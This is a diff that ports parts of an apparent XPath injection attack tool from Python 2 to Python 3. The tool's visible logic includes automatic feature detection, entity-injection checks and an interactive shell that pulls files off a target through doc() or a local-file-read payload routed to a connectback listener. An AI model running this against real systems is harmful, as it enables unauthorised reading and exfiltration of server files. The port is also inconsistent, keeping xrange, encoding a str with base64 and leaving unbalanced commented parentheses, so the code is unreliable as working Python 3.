@@ -58,7 +58,7 @@ def Count(payloads, node, count_type=CountTypes.STRING, _codepoint_count=None):
 
     for i in xrange(STEP):
         r = yield payloads.RunQuery(payloads.Get(search_query)(node=node,min=MIN,max=MAX,index=_codepoint_count))
-        #print payloads.Get(search_query)(node=node,min=MIN,max=MAX,index=_codepoint_count)
+        #print(payloads.Get(search_query)(node=node,min=MIN,max=MAX,index=_codepoint_count)
         #raw_input("Count: r = %s"%r)
         if not r:
             MIN+=INC
@@ -180,9 +180,9 @@ def GetXMLFromDefinedQuery(payloads, node):
     count = yield Count(payloads, node=node.replace("$COUNT","*"), count_type=CountTypes.LENGTH)
 
     if not count:
-        print "Found 0 nodes to extract, exiting"
+        print("Found 0 nodes to extract, exiting")
     else:
-        print "Found %s nodes to extract"%count
+        print("Found %s nodes to extract"%count)
 
         for i in xrange(1, count+1):
             _c = node.replace("$COUNT",str(i))
@@ -192,7 +192,7 @@ def GetXMLFromDefinedQuery(payloads, node):
 @defer.inlineCallbacks
 def GetXMLFromNode(payloads, node):
     global args
-    #print "Node: %s"%node
+    #print("Node: %s"%node
     node_name = yield GetCharacters(payloads, "name(%s)"%node, count_it=True)
     attribute_count = yield Count(payloads, node=node+"/@*", count_type=CountTypes.LENGTH)
     attributes = {}
@@ -217,7 +217,7 @@ def GetXMLFromNode(payloads, node):
                     writer.comment(comment)
 
     child_node_count = yield Count(payloads, node=node+"/*", count_type=CountTypes.LENGTH)
-    #print "Child node count: %s"%child_node_count
+    #print("Child node count: %s"%child_node_count
     if child_node_count:
         for i in xrange(1, child_node_count+1):
             yield GetXMLFromNode(payloads, node+"/*[%s]"%i)
@@ -267,7 +267,7 @@ def Main(args, site):
     payloads = payloadlib.PayloadMaker(args)
 
     if args.autopwn:
-        print " * Automatically detecting available features..."
+        print(" * Automatically detecting available features...")
         sys.stdout.write("   * Detecting quote: ")
         quote_char = yield DetectQuoteCharacter(copy.deepcopy(args))
         if not quote_char:
@@ -298,8 +298,8 @@ def Main(args, site):
             sys.stdout.flush()
             sys.stdout.write("   * Entity Injection Retrieval: ")
             inj = yield DetectEntityInjection(args)
-            if inj: print "Supported"
-            else:   print "Unsupported"
+            if inj: print("Supported")
+            else:   print("Unsupported")
 
 
     if args.xversion == "auto":
@@ -322,30 +322,30 @@ def Main(args, site):
             exit()
         #payloads.SetSearchSpace(string.ascii_letters + string.punctuation + string.digits + " ")
         cwd = yield GetCharacters(payloads, "document-uri(/)")
-        print "Working file: %s"%cwd
+        print("Working file: %s"%cwd)
     elif args.executequery:
         yield GetXMLFromDefinedQuery(payloads, args.executequery)
     elif args.fileshell:
 
         can_use_entity = yield DetectEntityInjection(args)
         if can_use_entity:
-            print " * Entity injection appears to be working"
+            print(" * Entity injection appears to be working")
         else:
-            print " * Entity injection is not available, using doc() fallback (only works on xml files)"
+            print(" * Entity injection is not available, using doc() fallback (only works on xml files)")
 
         _grabs = {"--doc":0,"--entity":1}
 
         grab_using = 0 # 0 = use Doc(), 1 = use READ_LOCAL_FILE
 
-        print "Enter a file URI. Available commands:"
-        print " * --getcwd : Returns the URI of the current document"
-        print " * --doc    : Use doc() to fetch files. Only works on XML files and returns the whole document"
+        print("Enter a file URI. Available commands:")
+        print(" * --getcwd : Returns the URI of the current document")
+        print(" * --doc    : Use doc() to fetch files. Only works on XML files and returns the whole document")
         if can_use_entity:
-            print " * --entity : Use entity injection to fetch files. Works best on text files with no XML characters in them (<,>,--). Must be absolute."
-        print "   -> Using doc() to fetch documents"
+            print(" * --entity : Use entity injection to fetch files. Works best on text files with no XML characters in them (<,>,--). Must be absolute.")
+        print("   -> Using doc() to fetch documents")
         while True:
             try:
-                file_path = raw_input("URI: ")
+                file_path = input("URI: ")
             except EOFError:
                 file_path = ""
 
@@ -354,22 +354,22 @@ def Main(args, site):
             else:
                 if file_path == "--getcwd":
                     cwd = yield GetCharacters(payloads, "document-uri(/)")
-                    print "Working file: %s"%cwd
+                    print("Working file: %s"%cwd)
                     continue
 
                 if file_path in _grabs:
                     grab_using = _grabs[file_path]
-                    print "Using %s method to get files"%(file_path.strip("--"))
+                    print("Using %s method to get files"%(file_path.strip("--")))
                     continue
 
                 if grab_using == 1:
                     fpath = base64.urlsafe_b64encode(file_path)
                     output = yield GetCharacters(payloads, payloads.Get("READ_LOCAL_FILE", wrap_base=False)(path=fpath,
                                                                                             host=args.connectback, node="data/string()"))
-                    print output
+                    print(output)
                 else:
                     yield GetXMLFromDefinedQuery(payloads, ("doc('%s')/*[$COUNT]"%file_path).replace("'", args.quote_character))
-                    print ""
+                    print("")
 
     else:
         yield GetXMLFromNode(payloads, "/*[1]")
@@ -483,7 +483,7 @@ def run_from_cmd():
         else:
             host,port = args.connectback.split(":")
             args.connectback_port = port
-        print "Connecback running on %s"%args.connectback
+        print("Connecback running on %s"%args.connectback)
         reactor.listenTCP(int(args.connectback_port), site, interface=args.connectback.split(":")[0])
 
 
